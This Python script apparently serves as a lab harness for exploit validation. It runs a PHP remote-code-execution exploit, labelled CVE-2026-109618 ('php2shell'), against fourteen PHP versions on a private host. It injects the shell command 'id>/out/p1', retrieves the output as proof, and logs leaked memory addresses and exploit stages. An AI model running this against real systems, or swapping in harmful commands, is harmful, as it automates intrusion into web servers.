from pathlib import Path
"""Per-version php2shell proof matrix — runs the REAL exploit against 18101-18114.

For each version: run CVE-2026-109618 with retries=1, capture stage reached,
success, and any real `id` evidence. Honest data: standard php:X-apache builds
are NOT the vulnerable build, so most will fail at stage1 (heap leak). That is
the real signal telling us which versions need a vulnerable-build lookup.
"""
import json
import time
import sys

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import poc

HOST = "192.168.8.123"
VERSIONS = [
    (18101, "5.4.45"), (18102, "5.5.38"), (18103, "5.6.40"),
    (18104, "7.0.33"), (18105, "7.1.33"), (18106, "7.2.34"),
    (18107, "7.3.33"), (18108, "7.4.33"), (18109, "8.0.30"),
    (18110, "8.1.32"), (18111, "8.2.34"), (18112, "8.3.35"),
    (18113, "8.4.26"), (18114, "8.5.11"),
]

results = []
for port, ver in VERSIONS:
    url = f"http://{HOST}:{port}/index.php"
    t0 = time.time()
    row = {"port": port, "version": ver, "url": url}
    try:
        r = poc.run_exploit("CVE-2026-109618", {
            "url": url,
            "cmd": "id>/out/p1",
            "profile": "bookworm",
            "proof_fetch": "/out/p1",
            "retries": 1,
            "huge_mb": 8,
            "timeout": 40,
        })
        row["success"] = bool(r.get("success"))
        row["stage"] = (r.get("detail") or {}).get("stage", "?")
        row["chunk_base"] = (r.get("detail") or {}).get("chunk_base")
        row["libphp_base"] = (r.get("detail") or {}).get("libphp_base")
        row["evidence"] = (r.get("evidence") or "")[:200]
        # last 3 log lines for diagnosis
        row["tail"] = (r.get("log") or [])[-3:]
    except Exception as e:
        row["error"] = f"{type(e).__name__}: {e}"
    row["secs"] = round(time.time() - t0, 1)
    results.append(row)
    print(f"[{ver}] port={port} success={row.get('success')} stage={row.get('stage')} "
          f"chunk={row.get('chunk_base')} libphp={row.get('libphp_base')} "
          f"ev={row.get('evidence')!r} {row.get('secs')}s", flush=True)

with open(str(Path(__file__).resolve().parent / "matrix_results.json"), "w") as f:
    json.dump(results, f, indent=2, ensure_ascii=False)

ok = [r for r in results if r.get("success")]
print("\n=== MATRIX SUMMARY ===", flush=True)
print(f"total={len(results)}  SUCCESS={len(ok)}  FAIL={len(results)-len(ok)}", flush=True)
for r in ok:
    print(f"  ✅ {r['version']} ({r['port']}): {r['evidence']}", flush=True)
print("DONE", flush=True)
